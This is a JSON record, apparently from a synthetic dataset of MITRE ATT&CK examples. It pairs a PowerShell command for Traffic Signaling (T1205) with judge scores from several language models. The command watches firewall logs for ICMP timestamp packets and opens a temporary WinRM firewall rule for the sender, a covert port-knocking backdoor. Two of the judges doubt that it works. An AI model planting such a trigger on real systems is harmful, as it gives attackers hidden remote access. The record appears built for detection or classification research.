{
  "technique_id": "T1205",
  "platform": "Windows",
  "shell": "PowerShell",
  "command": "Invoke-Command -ComputerName localhost -ScriptBlock { $log = \"$env:SystemRoot\\System32\\LogFiles\\Firewall\\pfirewall.log\"; Set-NetFirewallProfile -All -LogAllowed $true -LogDropped $true -LogFileName $log | Out-Null; Get-Content -Path $log -Tail 0 -Wait | ForEach-Object { if ($_ -match 'ALLOW\\s+ICMP\\s+(\\d{1,3}(?:\\.\\d{1,3}){3})\\s+(\\d{1,3}(?:\\.\\d{1,3}){3}).*?\\bicmp-type\\s+13\\b') { $src=$matches[1]; $name=\"winrm-icmp13-$($src.Replace('.','-'))\"; if (-not (Get-NetFirewallRule -DisplayName $name -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName $name -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5985 -RemoteAddress $src -Profile Any | Out-Null; Start-Job { param($n) Start-Sleep -Seconds 300; Remove-NetFirewallRule -DisplayName $n } -ArgumentList $name | Out-Null; } } } }",
  "explanation": "Uses an ICMP Timestamp (type 13) echo as a covert signal to temporarily allow WinRM (5985) from the sender\u2019s IP.",
  "rationale_steps": [
    "Enable firewall logging",
    "Watch for ALLOW ICMP entries with icmp-type 13",
    "On detection, add a scoped allow rule for TCP/5985 to the source IP",
    "Remove the rule after 5 minutes"
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1205-419c2bb8-a5b78e8a",
  "source_prompt_hash": "419c2bb8",
  "timestamp_utc": "2025-09-30T03:28:48.156174Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "PowerShell command is well-formed with balanced braces/quotes and valid cmdlets/parameters.",
        "semantic_score": 3,
        "semantic_justification": "Concept aligns with Traffic Signaling to trigger a temporary WinRM rule via ICMP, but it likely fails due to incorrect Windows Firewall log parsing (expects literal 'icmp-type 13' in entries), dependence on admin rights/WinRM for Invoke-Command, and possible missing log file.",
        "combined_score": 4.0,
        "confidence": 0.7,
        "timestamp": "2025-10-01T16:24:32.055337Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes/parentheses/braces, correct cmdlet usage, valid parameters, and a syntactically correct regex pattern.",
        "semantic_score": 2,
        "semantic_justification": "The command's logic perfectly aligns with the T1205 technique and its explanation; however, the explicit 'Privilege: None' renders it semantically incorrect as `Set-NetFirewallProfile` and `New-NetFirewallRule` require administrative privileges to function, making the claimed intent unachievable.",
        "combined_score": 3.5,
        "confidence": 1,
        "timestamp": "2025-10-01T16:24:55.012502Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, braces, and parentheses, proper PowerShell syntax throughout, and correct use of cmdlets and parameters.",
        "semantic_score": 5,
        "semantic_justification": "The command perfectly implements the Traffic Signaling technique by monitoring firewall logs for specific ICMP type 13 packets and using them as a covert signal to temporarily open WinRM access from the sender's IP address.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-02T03:16:28.368550Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 3.333,
    "llm_average_score": 4.167,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}